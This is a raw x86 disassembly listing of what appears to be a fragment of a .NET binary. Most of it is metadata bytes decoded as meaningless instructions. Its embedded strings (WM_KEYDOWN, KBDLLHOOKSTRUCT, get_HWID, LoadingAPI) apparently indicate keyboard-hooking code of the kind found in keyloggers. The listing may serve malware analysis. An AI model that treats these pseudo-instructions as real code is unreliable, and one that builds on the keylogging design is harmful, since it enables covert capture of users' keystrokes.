  409152:	03 00                	add    (%eax),%eax
  409154:	76 0b                	jbe    0x409161
  409156:	00 00                	add    %al,(%eax)
  409158:	01 00                	add    %eax,(%eax)
  40915a:	5f                   	pop    %edi
  40915b:	0c 00                	or     $0x0,%al
  40915d:	00 01                	add    %al,(%ecx)
  40915f:	00 76 0b             	add    %dh,0xb(%esi)
  409162:	00 00                	add    %al,(%eax)
  409164:	02 00                	add    (%eax),%al
  409166:	2f                   	das
  409167:	03 00                	add    (%eax),%eax
  409169:	00 01                	add    %al,(%ecx)
  40916b:	00 4a 07             	add    %cl,0x7(%edx)
  40916e:	00 00                	add    %al,(%eax)
  409170:	02 00                	add    (%eax),%al
  409172:	76 0b                	jbe    0x40917f
  409174:	00 00                	add    %al,(%eax)
  409176:	01 00                	add    %eax,(%eax)
  409178:	5f                   	pop    %edi
  409179:	0c 00                	or     $0x0,%al
  40917b:	00 01                	add    %al,(%ecx)
  40917d:	00 76 0b             	add    %dh,0xb(%esi)
  409180:	00 00                	add    %al,(%eax)
  409182:	02 00                	add    (%eax),%al
  409184:	2f                   	das
  409185:	03 00                	add    (%eax),%eax
  409187:	00 01                	add    %al,(%ecx)
  409189:	00 e7                	add    %ah,%bh
  40918b:	0b 00                	or     (%eax),%eax
  40918d:	00 01                	add    %al,(%ecx)
  40918f:	00 e7                	add    %ah,%bh
  409191:	0b 00                	or     (%eax),%eax
  409193:	00 02                	add    %al,(%edx)
  409195:	00 4a 07             	add    %cl,0x7(%edx)
  409198:	00 00                	add    %al,(%eax)
  40919a:	03 00                	add    (%eax),%eax
  40919c:	76 0b                	jbe    0x4091a9
  40919e:	00 00                	add    %al,(%eax)
  4091a0:	01 00                	add    %eax,(%eax)
  4091a2:	5f                   	pop    %edi
  4091a3:	0c 00                	or     $0x0,%al
  4091a5:	00 01                	add    %al,(%ecx)
  4091a7:	00 4d 00             	add    %cl,0x0(%ebp)
  4091aa:	00 00                	add    %al,(%eax)
  4091ac:	01 00                	add    %eax,(%eax)
  4091ae:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4091af:	04 00                	add    $0x0,%al
  4091b1:	00 01                	add    %al,(%ecx)
  4091b3:	00 4e 04             	add    %cl,0x4(%esi)
  4091b6:	00 00                	add    %al,(%eax)
  4091b8:	01 00                	add    %eax,(%eax)
  4091ba:	43                   	inc    %ebx
  4091bb:	03 00                	add    (%eax),%eax
  4091bd:	00 02                	add    %al,(%edx)
  4091bf:	00 87 08 00 00 01    	add    %al,0x1000008(%edi)
  4091c5:	00 16                	add    %dl,(%esi)
  4091c7:	04 00                	add    $0x0,%al
  4091c9:	00 01                	add    %al,(%ecx)
  4091cb:	00 6f 0a             	add    %ch,0xa(%edi)
  4091ce:	00 00                	add    %al,(%eax)
  4091d0:	02 00                	add    (%eax),%al
  4091d2:	4e                   	dec    %esi
  4091d3:	04 00                	add    $0x0,%al
  4091d5:	00 01                	add    %al,(%ecx)
  4091d7:	00 05 08 00 00 01    	add    %al,0x1000008
  4091dd:	00 89 0a 00 00 02    	add    %cl,0x200000a(%ecx)
  4091e3:	00 7d 0a             	add    %bh,0xa(%ebp)
  4091e6:	00 00                	add    %al,(%eax)
  4091e8:	03 00                	add    (%eax),%eax
  4091ea:	38 04 00             	cmp    %al,(%eax,%eax,1)
  4091ed:	00 01                	add    %al,(%ecx)
  4091ef:	00 4e 09             	add    %cl,0x9(%esi)
  4091f2:	00 00                	add    %al,(%eax)
  4091f4:	02 00                	add    (%eax),%al
  4091f6:	ad                   	lods   %ds:(%esi),%eax
  4091f7:	06                   	push   %es
  4091f8:	06                   	push   %es
  4091f9:	00 51 00             	add    %dl,0x0(%ecx)
  4091fc:	21 00                	and    %eax,(%eax)
  4091fe:	ca 09 16             	lret   $0x1609
  409201:	00 19                	add    %bl,(%ecx)
  409203:	00 ca                	add    %cl,%dl
  409205:	09 1c 00             	or     %ebx,(%eax,%eax,1)
  409208:	11 00                	adc    %eax,(%eax)
  40920a:	ca 09 22             	lret   $0x2209
  40920d:	00 29                	add    %ch,(%ecx)
  40920f:	00 0d 09 26 00 29    	add    %cl,0x29002609
  409215:	00 e6                	add    %ah,%dh
  409217:	0d 29 00 19 00       	or     $0x190029,%eax
  40921c:	90                   	nop
  40921d:	0c 22                	or     $0x22,%al
  40921f:	00 31                	add    %dh,(%ecx)
  409221:	00 12                	add    %dl,(%edx)
  409223:	0b 2f                	or     (%edi),%ebp
  409225:	00 31                	add    %dh,(%ecx)
  409227:	00 f0                	add    %dh,%al
  409229:	03 34 00             	add    (%eax,%eax,1),%esi
  40922c:	39 00                	cmp    %eax,(%eax)
  40922e:	24 0b                	and    $0xb,%al
  409230:	39 00                	cmp    %eax,(%eax)
  409232:	41                   	inc    %ecx
  409233:	00 f2                	add    %dh,%dl
  409235:	08 0a                	or     %cl,(%edx)
  409237:	00 11                	add    %dl,(%ecx)
  409239:	00 ca                	add    %cl,%dl
  40923b:	09 44 00 09          	or     %eax,0x9(%eax,%eax,1)
  40923f:	00 11                	add    %dl,(%ecx)
  409241:	07                   	pop    %es
  409242:	49                   	dec    %ecx
  409243:	00 29                	add    %ch,(%ecx)
  409245:	00 2a                	add    %ch,(%edx)
  409247:	0c 75                	or     $0x75,%al
  409249:	00 29                	add    %ch,(%ecx)
  40924b:	00 da                	add    %bl,%dl
  40924d:	0d 29 00 69 00       	or     $0x690029,%eax
  409252:	08 00                	or     %al,(%eax)
  409254:	7a 00                	jp     0x409256
  409256:	71 00                	jno    0x409258
  409258:	8f 09 49 00          	(bad)
  40925c:	71 00                	jno    0x40925e
  40925e:	b7 09                	mov    $0x9,%bh
  409260:	49                   	dec    %ecx
  409261:	00 71 00             	add    %dh,0x0(%ecx)
  409264:	68 0b 7f 00 71       	push   $0x71007f0b
  409269:	00 da                	add    %bl,%dl
  40926b:	0d 86 00 71 00       	or     $0x710086,%eax
  409270:	f4                   	hlt
  409271:	0d 8c 00 11 00       	or     $0x11008c,%eax
  409276:	23 03                	and    (%ebx),%eax
  409278:	91                   	xchg   %eax,%ecx
  409279:	00 61 00             	add    %ah,0x0(%ecx)
  40927c:	e7 0c                	out    %eax,$0xc
  40927e:	97                   	xchg   %eax,%edi
  40927f:	00 61 00             	add    %ah,0x0(%ecx)
  409282:	f8                   	clc
  409283:	06                   	push   %es
  409284:	49                   	dec    %ecx
  409285:	00 71 00             	add    %dh,0x0(%ecx)
  409288:	68 0b 9c 00 71       	push   $0x71009c0b
  40928d:	00 68 0b             	add    %ch,0xb(%eax)
  409290:	a2 00 79 00 ca       	mov    %al,0xca007900
  409295:	09 a8 00 09 00 ca    	or     %ebp,-0x35fff700(%eax)
  40929b:	09 22                	or     %esp,(%edx)
  40929d:	00 b1 00 ca 09 22    	add    %dh,0x2209ca00(%ecx)
  4092a3:	00 99 00 ca 09 16    	add    %bl,0x1609ca00(%ecx)
  4092a9:	00 b9 00 ca 09 9b    	add    %bh,-0x64f63600(%ecx)
  4092af:	01 b9 00 c7 08 a5    	add    %edi,-0x5af73900(%ecx)
  4092b5:	01 a9 00 a4 0c 49    	add    %ebp,0x490ca400(%ecx)
  4092bb:	00 a9 00 96 0c ae    	add    %ch,-0x51f36a00(%ecx)
  4092c1:	01 b9 00 80 0b b2    	add    %edi,-0x4df48000(%ecx)
  4092c7:	01 b9 00 b5 07 cb    	add    %edi,-0x34f84b00(%ecx)
  4092cd:	01 b9 00 93 06 d2    	add    %edi,-0x2df96d00(%ecx)
  4092d3:	01 f9                	add    %edi,%ecx
  4092d5:	00 12                	add    %dl,(%edx)
  4092d7:	00 dc                	add    %bl,%ah
  4092d9:	01 01                	add    %eax,(%ecx)
  4092db:	01 c8                	add    %ecx,%eax
  4092dd:	0b ed                	or     %ebp,%ebp
  4092df:	01 09                	add    %ecx,(%ecx)
  4092e1:	01 8c 04 04 02 01 01 	add    %ecx,0x1010204(%esp,%eax,1)
  4092e8:	b8 0b 20 02 19       	mov    $0x1902200b,%eax
  4092ed:	01 a4 09 29 02 f9 00 	add    %esp,0xf90229(%ecx,%ecx,1)
  4092f4:	97                   	xchg   %eax,%edi
  4092f5:	0a 30                	or     (%eax),%dh
  4092f7:	02 b9 00 1e 03 36    	add    0x36031e00(%ecx),%bh
  4092fd:	02 b9 00 1e 03 d2    	add    -0x2dfce200(%ecx),%bh
  409303:	01 19                	add    %ebx,(%ecx)
  409305:	01 4d 0c             	add    %ecx,0xc(%ebp)
  409308:	3c 02                	cmp    $0x2,%al
  40930a:	b9 00 ae 04 22       	mov    $0x2204ae00,%ecx
  40930f:	00 b9 00 b4 04 22    	add    %bh,0x2204b400(%ecx)
  409315:	00 21                	add    %ah,(%ecx)
  409317:	01 76 0d             	add    %esi,0xd(%esi)
  40931a:	49                   	dec    %ecx
  40931b:	00 21                	add    %ah,(%ecx)
  40931d:	01 12                	add    %edx,(%edx)
  40931f:	09 49 00             	or     %ecx,0x0(%ecx)
  409322:	21 01                	and    %eax,(%ecx)
  409324:	30 00                	xor    %al,(%eax)
  409326:	49                   	dec    %ecx
  409327:	00 21                	add    %ah,(%ecx)
  409329:	01 f4                	add    %esi,%esp
  40932b:	0b 9a 02 21 01 a4    	or     -0x5bfedefe(%edx),%ebx
  409331:	0c 6c                	or     $0x6c,%al
  409333:	01 29                	add    %ebp,(%ecx)
  409335:	01 ce                	add    %ecx,%esi
  409337:	0d 0a 00 39 01       	or     $0x139000a,%eax
  40933c:	0d 04 49 00 51       	or     $0x51004904,%eax
  409341:	01 40 08             	add    %eax,0x8(%eax)
  409344:	d1 02                	roll   $1,(%edx)
  409346:	51                   	push   %ecx
  409347:	01 61 0a             	add    %esp,0xa(%ecx)
  40934a:	d7                   	xlat   %ds:(%ebx)
  40934b:	02 41 01             	add    0x1(%ecx),%al
  40934e:	30 04 de             	xor    %al,(%esi,%ebx,8)
  409351:	02 49 01             	add    0x1(%ecx),%cl
  409354:	0d 04 49 00 71       	or     $0x71004904,%eax
  409359:	00 e6                	add    %ah,%dh
  40935b:	0a e4                	or     %ah,%ah
  40935d:	02 49 01             	add    0x1(%ecx),%cl
  409360:	fd                   	std
  409361:	08 ed                	or     %ch,%ch
  409363:	02 61 01             	add    0x1(%ecx),%ah
  409366:	f6 04 02 03          	testb  $0x3,(%edx,%eax,1)
  40936a:	61                   	popa
  40936b:	01 b6 01 0a 03 41    	add    %esi,0x41030a01(%esi)
  409371:	01 ab 0d 2e 03 71    	add    %ebp,0x71032e0d(%ebx)
  409377:	00 33                	add    %dh,(%ebx)
  409379:	07                   	pop    %es
  40937a:	34 03                	xor    $0x3,%al
  40937c:	41                   	inc    %ecx
  40937d:	01 d0                	add    %edx,%eax
  40937f:	07                   	pop    %es
  409380:	39 03                	cmp    %eax,(%ebx)
  409382:	69 01 ca 09 40 03    	imul   $0x34009ca,(%ecx),%eax
  409388:	71 01                	jno    0x40938b
  40938a:	ca 09 22             	lret   $0x2209
  40938d:	00 61 01             	add    %ah,0x1(%ecx)
  409390:	ba 08 4a 03 a1       	mov    $0xa1034a08,%edx
  409395:	00 b4 04 22 00 0c 00 	add    %dh,0xc0022(%esp,%eax,1)
  40939c:	81 06 62 03 61 01    	addl   $0x1610362,(%esi)
  4093a2:	28 07                	sub    %al,(%edi)
  4093a4:	79 03                	jns    0x4093a9
  4093a6:	71 00                	jno    0x4093a8
  4093a8:	66 0c 49             	data16 or $0x49,%al
  4093ab:	00 41 01             	add    %al,0x1(%ecx)
  4093ae:	e1 01                	loope  0x4093b1
  4093b0:	96                   	xchg   %eax,%esi
  4093b1:	03 41 01             	add    0x1(%ecx),%eax
  4093b4:	e1 01                	loope  0x4093b7
  4093b6:	a0 03 81 01 0d       	mov    0xd018103,%al
  4093bb:	04 49                	add    $0x49,%al
  4093bd:	00 14 00             	add    %dl,(%eax,%eax,1)
  4093c0:	61                   	popa
  4093c1:	0d d5 03 49 01       	or     $0x14903d5,%eax
  4093c6:	ca 09 8b             	lret   $0x8b09
  4093c9:	01 41 01             	add    %eax,0x1(%ecx)
  4093cc:	e6 0d                	out    %al,$0xd
  4093ce:	db 03                	fildl  (%ebx)
  4093d0:	41                   	inc    %ecx
  4093d1:	01 da                	add    %ebx,%edx
  4093d3:	0d db 03 14 00       	or     $0x1403db,%eax
  4093d8:	1a 08                	sbb    (%eax),%cl
  4093da:	e5 03                	in     $0x3,%eax
  4093dc:	49                   	dec    %ecx
  4093dd:	01 a0 0a ed 03 41    	add    %esp,0x4103ed0a(%eax)
  4093e3:	01 e1                	add    %esp,%ecx
  4093e5:	01 f3                	add    %esi,%ebx
  4093e7:	02 14 00             	add    (%eax,%eax,1),%dl
  4093ea:	ca 09 22             	lret   $0x2209
  4093ed:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4093f0:	ca 09 22             	lret   $0x2209
  4093f3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4093f6:	e6 01                	out    %al,$0x1
  4093f8:	e5 03                	in     $0x3,%eax
  4093fa:	91                   	xchg   %eax,%ecx
  4093fb:	01 8d 03 fd 03 99    	add    %ecx,-0x66fc02fd(%ebp)
  409401:	01 ca                	add    %ecx,%edx
  409403:	09 16                	or     %edx,(%esi)
  409405:	00 51 01             	add    %dl,0x1(%ecx)
  409408:	9b                   	fwait
  409409:	06                   	push   %es
  40940a:	04 04                	add    $0x4,%al
  40940c:	a1 01 ca 09 44       	mov    0x4409ca01,%eax
  409411:	00 a9 01 ca 09 22    	add    %ch,0x2209ca01(%ecx)
  409417:	00 b1 01 ca 09 51    	add    %dh,0x5109ca01(%ecx)
  40941d:	04 c1                	add    $0xc1,%al
  40941f:	01 ca                	add    %ecx,%edx
  409421:	09 8b 01 c9 01 ca    	or     %ecx,-0x35fe36ff(%ebx)
  409427:	09 8b 01 d1 01 ca    	or     %ecx,-0x35fe2eff(%ebx)
  40942d:	09 8b 01 d9 01 ca    	or     %ecx,-0x35fe26ff(%ebx)
  409433:	09 8b 01 e1 01 ca    	or     %ecx,-0x35fe1eff(%ebx)
  409439:	09 8b 01 e9 01 ca    	or     %ecx,-0x35fe16ff(%ebx)
  40943f:	09 8b 01 f1 01 ca    	or     %ecx,-0x35fe0eff(%ebx)
  409445:	09 8b 01 f9 01 ca    	or     %ecx,-0x35fe06ff(%ebx)
  40944b:	09 86 01 01 02 ca    	or     %eax,-0x35fdfeff(%esi)
  409451:	09 8b 01 09 02 ca    	or     %ecx,-0x35fdf6ff(%ebx)
  409457:	09 8b 01 11 02 ca    	or     %ecx,-0x35fdeeff(%ebx)
  40945d:	09 8b 01 0e 00 0c    	or     %ecx,0xc000e01(%ebx)
  409463:	00 b9 00 06 00 14    	add    %bh,0x14000600(%ecx)
  409469:	00 d1                	add    %dl,%cl
  40946b:	00 08                	add    %cl,(%eax)
  40946d:	00 18                	add    %bl,(%eax)
  40946f:	00 d7                	add    %dl,%bh
  409471:	00 0e                	add    %cl,(%esi)
  409473:	00 88 00 0b 04 0e    	add    %cl,0xe040b00(%eax)
  409479:	00 8c 00 1a 04 2e 00 	add    %cl,0x2e041a(%eax,%eax,1)
  409480:	cb                   	lret
  409481:	02 29                	add    (%ecx),%ch
  409483:	04 2e                	add    $0x2e,%al
  409485:	00 d3                	add    %dl,%bl
  409487:	02 32                	add    (%edx),%dh
  409489:	04 2e                	add    $0x2e,%al
  40948b:	00 db                	add    %bl,%bl
  40948d:	02 58 04             	add    0x4(%eax),%bl
  409490:	2e 00 e3             	cs add %ah,%bl
  409493:	02 61 04             	add    0x4(%ecx),%ah
  409496:	2e 00 eb             	cs add %ch,%bl
  409499:	02 70 04             	add    0x4(%eax),%dh
  40949c:	2e 00 f3             	cs add %dh,%bl
  40949f:	02 70 04             	add    0x4(%eax),%dh
  4094a2:	2e 00 fb             	cs add %bh,%bl
  4094a5:	02 70 04             	add    0x4(%eax),%dh
  4094a8:	2e 00 03             	add    %al,%cs:(%ebx)
  4094ab:	03 61 04             	add    0x4(%ecx),%esp
  4094ae:	2e 00 0b             	add    %cl,%cs:(%ebx)
  4094b1:	03 76 04             	add    0x4(%esi),%esi
  4094b4:	2e 00 13             	add    %dl,%cs:(%ebx)
  4094b7:	03 70 04             	add    0x4(%eax),%esi
  4094ba:	2e 00 1b             	add    %bl,%cs:(%ebx)
  4094bd:	03 70 04             	add    0x4(%eax),%esi
  4094c0:	2e 00 23             	add    %ah,%cs:(%ebx)
  4094c3:	03 8e 04 2e 00 2b    	add    0x2b002e04(%esi),%ecx
  4094c9:	03 b8 04 2e 00 33    	add    0x33002e04(%eax),%edi
  4094cf:	03 c5                	add    %ebp,%eax
  4094d1:	04 83                	add    $0x83,%al
  4094d3:	01 e3                	add    %esp,%ebx
  4094d5:	00 50 01             	add    %dl,0x1(%eax)
  4094d8:	c1 01 e3             	roll   $0xe3,(%ecx)
  4094db:	00 50 01             	add    %dl,0x1(%eax)
  4094de:	e1 01                	loope  0x4094e1
  4094e0:	e3 00                	jecxz  0x4094e2
  4094e2:	50                   	push   %eax
  4094e3:	01 01                	add    %eax,(%ecx)
  4094e5:	02 e3                	add    %bl,%ah
  4094e7:	00 50 01             	add    %dl,0x1(%eax)
  4094ea:	21 02                	and    %eax,(%edx)
  4094ec:	e3 00                	jecxz  0x4094ee
  4094ee:	50                   	push   %eax
  4094ef:	01 41 02             	add    %eax,0x2(%ecx)
  4094f2:	e3 00                	jecxz  0x4094f4
  4094f4:	50                   	push   %eax
  4094f5:	01 61 02             	add    %esp,0x2(%ecx)
  4094f8:	e3 00                	jecxz  0x4094fa
  4094fa:	50                   	push   %eax
  4094fb:	01 81 02 e3 00 50    	add    %eax,0x5000e302(%ecx)
  409501:	01 40 03             	add    %eax,0x3(%eax)
  409504:	e3 00                	jecxz  0x409506
  409506:	50                   	push   %eax
  409507:	01 60 03             	add    %esp,0x3(%eax)
  40950a:	e3 00                	jecxz  0x40950c
  40950c:	50                   	push   %eax
  40950d:	01 80 03 e3 00 50    	add    %eax,0x5000e303(%eax)
  409513:	01 a0 03 e3 00 50    	add    %esp,0x5000e303(%eax)
  409519:	01 c0                	add    %eax,%eax
  40951b:	03 e3                	add    %ebx,%esp
  40951d:	00 50 01             	add    %dl,0x1(%eax)
  409520:	e0 03                	loopne 0x409525
  409522:	e3 00                	jecxz  0x409524
  409524:	50                   	push   %eax
  409525:	01 00                	add    %eax,(%eax)
  409527:	04 e3                	add    $0xe3,%al
  409529:	00 50 01             	add    %dl,0x1(%eax)
  40952c:	20 04 e3             	and    %al,(%ebx,%eiz,8)
  40952f:	00 50 01             	add    %dl,0x1(%eax)
  409532:	40                   	inc    %eax
  409533:	04 e3                	add    $0xe3,%al
  409535:	00 50 01             	add    %dl,0x1(%eax)
  409538:	60                   	pusha
  409539:	04 e3                	add    $0xe3,%al
  40953b:	00 50 01             	add    %dl,0x1(%eax)
  40953e:	80 04 e3 00          	addb   $0x0,(%ebx,%eiz,8)
  409542:	50                   	push   %eax
  409543:	01 a0 04 e3 00 50    	add    %esp,0x5000e304(%eax)
  409549:	01 c0                	add    %eax,%eax
  40954b:	04 e3                	add    $0xe3,%al
  40954d:	00 50 01             	add    %dl,0x1(%eax)
  409550:	e0 04                	loopne 0x409556
  409552:	e3 00                	jecxz  0x409554
  409554:	50                   	push   %eax
  409555:	01 17                	add    %edx,(%edi)
  409557:	00 f8                	add    %bh,%al
  409559:	00 21                	add    %ah,(%ecx)
  40955b:	00 07                	add    %al,(%edi)
  40955d:	01 3d 00 51 00 63    	add    %edi,0x63005100
  409563:	00 97 01 be 01 e8    	add    %dl,-0x17fe41ff(%edi)
  409569:	01 fe                	add    %edi,%esi
  40956b:	01 11                	add    %edx,(%ecx)
  40956d:	02 48 02             	add    0x2(%eax),%cl
  409570:	c3                   	ret
  409571:	02 fc                	add    %ah,%bh
  409573:	02 1c 03             	add    (%ebx,%eax,1),%bl
  409576:	56                   	push   %esi
  409577:	03 85 03 bf 03 06    	add    0x603bf03(%ebp),%eax
  40957d:	00 01                	add    %al,(%ecx)
  40957f:	00 00                	add    %al,(%eax)
  409581:	00 b1 0c 4c 02 00    	add    %dh,0x24c0c(%ecx)
  409587:	00 23                	add    %ah,(%ebx)
  409589:	0c 51                	or     $0x51,%al
  40958b:	02 00                	add    (%eax),%al
  40958d:	00 53 02             	add    %dl,0x2(%ebx)
  409590:	56                   	push   %esi
  409591:	02 00                	add    (%eax),%al
  409593:	00 3d 00 5a 02 00    	add    %bh,0x25a00
  409599:	00 21                	add    %ah,(%ecx)
  40959b:	09 5a 02             	or     %ebx,0x2(%edx)
  40959e:	00 00                	add    %al,(%eax)
  4095a0:	82 0d 5a 02 00 00 48 	orb    $0x48,0x25a
  4095a7:	0c 56                	or     $0x56,%al
  4095a9:	02 02                	add    (%edx),%al
  4095ab:	00 1a                	add    %bl,(%edx)
  4095ad:	00 03                	add    %al,(%ebx)
  4095af:	00 01                	add    %al,(%ecx)
  4095b1:	00 1b                	add    %bl,(%ebx)
  4095b3:	00 03                	add    %al,(%ebx)
  4095b5:	00 02                	add    %al,(%edx)
  4095b7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4095ba:	05 00 01 00 1d       	add    $0x1d000100,%eax
  4095bf:	00 05 00 02 00 1e    	add    %al,0x1e000200
  4095c5:	00 07                	add    %al,(%edi)
  4095c7:	00 01                	add    %al,(%ecx)
  4095c9:	00 1f                	add    %bl,(%edi)
  4095cb:	00 07                	add    %al,(%edi)
  4095cd:	00 02                	add    %al,(%edx)
  4095cf:	00 20                	add    %ah,(%eax)
  4095d1:	00 09                	add    %cl,(%ecx)
  4095d3:	00 01                	add    %al,(%ecx)
  4095d5:	00 21                	add    %ah,(%ecx)
  4095d7:	00 09                	add    %cl,(%ecx)
  4095d9:	00 02                	add    %al,(%edx)
  4095db:	00 22                	add    %ah,(%edx)
  4095dd:	00 0b                	add    %cl,(%ebx)
  4095df:	00 01                	add    %al,(%ecx)
  4095e1:	00 23                	add    %ah,(%ebx)
  4095e3:	00 0b                	add    %cl,(%ebx)
  4095e5:	00 02                	add    %al,(%edx)
  4095e7:	00 24 00             	add    %ah,(%eax,%eax,1)
  4095ea:	0d 00 01 00 25       	or     $0x25000100,%eax
  4095ef:	00 0d 00 02 00 26    	add    %cl,0x26000200
  4095f5:	00 0f                	add    %cl,(%edi)
  4095f7:	00 01                	add    %al,(%ecx)
  4095f9:	00 27                	add    %ah,(%edi)
  4095fb:	00 0f                	add    %cl,(%edi)
  4095fd:	00 9c 07 5a 03 cd 03 	add    %bl,0x3cd035a(%edi,%eax,1)
  409604:	00 01                	add    %al,(%ecx)
  409606:	17                   	pop    %ss
  409607:	00 0f                	add    %cl,(%edi)
  409609:	0d 01 00 00 01       	or     $0x1000001,%eax
  40960e:	19 00                	sbb    %eax,(%eax)
  409610:	b6 0c                	mov    $0xc,%dh
  409612:	01 00                	add    %eax,(%eax)
  409614:	00 01                	add    %al,(%ecx)
  409616:	1b 00                	sbb    (%eax),%eax
  409618:	34 0d                	xor    $0xd,%al
  40961a:	01 00                	add    %eax,(%eax)
  40961c:	00 01                	add    %al,(%ecx)
  40961e:	1d 00 ce 04 01       	sbb    $0x104ce00,%eax
  409623:	00 00                	add    %al,(%eax)
  409625:	01 1f                	add    %ebx,(%edi)
  409627:	00 03                	add    %al,(%ebx)
  409629:	0d 01 00 00 01       	or     $0x1000001,%eax
  40962e:	21 00                	and    %eax,(%eax)
  409630:	53                   	push   %ebx
  409631:	0d 01 00 46 01       	or     $0x1460001,%eax
  409636:	23 00                	and    (%eax),%eax
  409638:	23 0d 01 00 00 01    	and    0x1000001,%ecx
  40963e:	25 00 ef 0c 01       	and    $0x10cef00,%eax
  409643:	00 00                	add    %al,(%eax)
  409645:	01 27                	add    %esp,(%edi)
  409647:	00 7a 01             	add    %bh,0x1(%edx)
  40964a:	01 00                	add    %eax,(%eax)
  40964c:	00 01                	add    %al,(%ecx)
  40964e:	29 00                	sub    %eax,(%eax)
  409650:	ea 04 01 00 00 01 2b 	ljmp   $0x2b01,$0x104
  409657:	00 d4                	add    %dl,%ah
  409659:	0c 01                	or     $0x1,%al
  40965b:	00 04 80             	add    %al,(%eax,%eax,4)
  40965e:	00 00                	add    %al,(%eax)
  409660:	01 00                	add    %eax,(%eax)
	...
  40966e:	55                   	push   %ebp
  40966f:	09 00                	or     %eax,(%eax)
  409671:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40967c:	00 00                	add    %al,(%eax)
  40967e:	01 00                	add    %eax,(%eax)
  409680:	c4 00                	les    (%eax),%eax
  409682:	00 00                	add    %al,(%eax)
  409684:	00 00                	add    %al,(%eax)
  409686:	04 00                	add    $0x0,%al
	...
  409690:	00 00                	add    %al,(%eax)
  409692:	01 00                	add    %eax,(%eax)
  409694:	fd                   	std
  409695:	0a 00                	or     (%eax),%al
  409697:	00 00                	add    %al,(%eax)
  409699:	00 01                	add    %al,(%ecx)
	...
  4096a7:	00 b3 00 00 00 00    	add    %dh,0x0(%ebx)
  4096ad:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4096b8:	00 00                	add    %al,(%eax)
  4096ba:	01 00                	add    %eax,(%eax)
  4096bc:	23 08                	and    (%eax),%ecx
	...
  4096c6:	02 00                	add    (%eax),%al
  4096c8:	00 00                	add    %al,(%eax)
  4096ca:	01 02                	add    %eax,(%edx)
  4096cc:	00 00                	add    %al,(%eax)
  4096ce:	94                   	xchg   %eax,%esp
  4096cf:	07                   	pop    %es
  4096d0:	00 00                	add    %al,(%eax)
  4096d2:	02 00                	add    (%eax),%al
  4096d4:	00 00                	add    %al,(%eax)
  4096d6:	20 02                	and    %al,(%edx)
  4096d8:	00 00                	add    %al,(%eax)
  4096da:	04 00                	add    $0x0,%al
  4096dc:	03 00                	add    (%eax),%eax
  4096de:	05 00 03 00 07       	add    $0x7000300,%eax
  4096e3:	00 06                	add    %al,(%esi)
  4096e5:	00 08                	add    %cl,(%eax)
  4096e7:	00 06                	add    %al,(%esi)
  4096e9:	00 09                	add    %cl,(%ecx)
  4096eb:	00 06                	add    %al,(%esi)
  4096ed:	00 0a                	add    %cl,(%edx)
  4096ef:	00 06                	add    %al,(%esi)
  4096f1:	00 00                	add    %al,(%eax)
  4096f3:	00 00                	add    %al,(%eax)
  4096f5:	75 73                	jne    0x40976a
  4096f7:	65 72 33             	gs jb  0x40972d
  4096fa:	32 00                	xor    (%eax),%al
  4096fc:	52                   	push   %edx
  4096fd:	65 61                	gs popa
  4096ff:	64 49                	fs dec %ecx
  409701:	6e                   	outsb  %ds:(%esi),(%dx)
  409702:	74 33                	je     0x409737
  409704:	32 00                	xor    (%eax),%al
  409706:	54                   	push   %esp
  409707:	6f                   	outsl  %ds:(%esi),(%dx)
  409708:	49                   	dec    %ecx
  409709:	6e                   	outsb  %ds:(%esi),(%dx)
  40970a:	74 33                	je     0x40973f
  40970c:	32 00                	xor    (%eax),%al
  40970e:	44                   	inc    %esp
  40970f:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  409716:	72 79                	jb     0x409791
  409718:	60                   	pusha
  409719:	32 00                	xor    (%eax),%al
  40971b:	3c 4d                	cmp    $0x4d,%al
  40971d:	6f                   	outsl  %ds:(%esi),(%dx)
  40971e:	64 75 6c             	fs jne 0x40978d
  409721:	65 3e 00 67 65       	gs add %ah,%ds:0x65(%edi)
  409726:	74 5f                	je     0x409787
  409728:	48                   	dec    %eax
  409729:	57                   	push   %edi
  40972a:	49                   	dec    %ecx
  40972b:	44                   	inc    %esp
  40972c:	00 73 65             	add    %dh,0x65(%ebx)
  40972f:	74 5f                	je     0x409790
  409731:	48                   	dec    %eax
  409732:	57                   	push   %edi
  409733:	49                   	dec    %ecx
  409734:	44                   	inc    %esp
  409735:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  409739:	64 69 6e 67 41 50 49 	imul   $0x495041,%fs:0x67(%esi),%ebp
  409740:	00 
  409741:	6c                   	insb   (%dx),%es:(%edi)
  409742:	6f                   	outsl  %ds:(%esi),(%dx)
  409743:	61                   	popa
  409744:	64 69 6e 67 41 50 49 	imul   $0x495041,%fs:0x67(%esi),%ebp
  40974b:	00 
  40974c:	57                   	push   %edi
  40974d:	4d                   	dec    %ebp
  40974e:	5f                   	pop    %edi
  40974f:	53                   	push   %ebx
  409750:	59                   	pop    %ecx
  409751:	53                   	push   %ebx
  409752:	4b                   	dec    %ebx
  409753:	45                   	inc    %ebp
  409754:	59                   	pop    %ecx
  409755:	44                   	inc    %esp
  409756:	4f                   	dec    %edi
  409757:	57                   	push   %edi
  409758:	4e                   	dec    %esi
  409759:	00 57 4d             	add    %dl,0x4d(%edi)
  40975c:	5f                   	pop    %edi
  40975d:	4b                   	dec    %ebx
  40975e:	45                   	inc    %ebp
  40975f:	59                   	pop    %ecx
  409760:	44                   	inc    %esp
  409761:	4f                   	dec    %edi
  409762:	57                   	push   %edi
  409763:	4e                   	dec    %esi
  409764:	00 53 79             	add    %dl,0x79(%ebx)
  409767:	73 74                	jae    0x4097dd
  409769:	65 6d                	gs insl (%dx),%es:(%edi)
  40976b:	2e 49                	cs dec %ecx
  40976d:	4f                   	dec    %edi
  40976e:	00 4b 42             	add    %cl,0x42(%ebx)
  409771:	44                   	inc    %esp
  409772:	4c                   	dec    %esp
  409773:	4c                   	dec    %esp
  409774:	48                   	dec    %eax
  409775:	4f                   	dec    %edi
  409776:	4f                   	dec    %edi
  409777:	4b                   	dec    %ebx
  409778:	53                   	push   %ebx
  409779:	54                   	push   %esp
  40977a:	52                   	push   %edx
  40977b:	55                   	push   %ebp
  40977c:	43                   	inc    %ebx
  40977d:	54                   	push   %esp
  40977e:	00 65 78             	add    %ah,0x78(%ebp)
  409781:	74 72                	je     0x4097f5
  409783:	61                   	popa
  409784:	00 43 6f             	add    %al,0x6f(%ebx)
